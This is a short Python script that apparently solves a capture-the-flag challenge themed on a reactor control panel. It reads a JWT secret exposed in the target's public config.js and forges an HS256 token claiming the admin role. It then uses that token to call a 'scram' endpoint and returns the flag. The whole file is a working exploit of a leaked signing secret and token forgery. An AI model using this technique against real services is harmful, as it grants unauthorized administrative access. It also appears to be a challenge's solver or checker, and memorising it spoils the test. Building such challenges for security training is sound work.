import os, re, requests
import jwt
def solve():
    url=os.environ.get("PWR_URL","http://127.0.0.1:8080")
    config=requests.get(url+"/static/config.js",timeout=3).text
    secret=re.search(r'JWT_SECRET: "([^"]+)"',config).group(1)
    token=jwt.encode({"user":"gm-check","role":"admin"},secret,algorithm="HS256")
    return requests.post(url+"/api/reactor/scram",headers={"Authorization":"Bearer "+token},timeout=3).json()["flag"]
